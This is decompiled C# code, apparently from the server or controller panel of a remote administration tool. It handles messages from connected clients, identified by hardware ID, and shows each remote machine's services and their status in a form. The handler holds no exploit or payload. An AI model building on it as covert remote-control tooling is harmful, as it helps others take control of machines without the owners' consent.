using System;
using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000059 RID: 89
	internal class HandlerService
	{
		// Token: 0x060001E8 RID: 488 RVA: 0x0001E3E8 File Offset: 0x0001C5E8
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "Status"))
					{
						if (!(a == "List"))
						{
							return;
						}
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormService form = (FormService)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.dataGridView2.Rows.Clear();
							form.materialLabel1.Text = "Succues list";
							int i = 2;
							while (i < objects.Length)
							{
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								form.dataGridView2.Rows.Add(dataGridViewRow);
							}
						}));
						return;
					}
					else
					{
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormService form = (FormService)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.materialLabel1.Text = "Succues status";
							foreach (object obj in ((IEnumerable)form.dataGridView2.Rows))
							{
								DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
								if (dataGridViewRow.Cells[1].Value as string == (string)objects[2])
								{
									dataGridViewRow.Cells[1].Value = (string)objects[3];
									break;
								}
							}
						}));
						return;
					}
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormService form = (FormService)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
			}
			else
			{
				FormService form = (FormService)Application.OpenForms["Service:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Service [" + (string)objects[2] + "]";
					form.client = client;
					form.materialLabel1.Enabled = true;
					form.dataGridView2.Enabled = true;
					form.materialLabel1.Text = "Succues Connect";
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
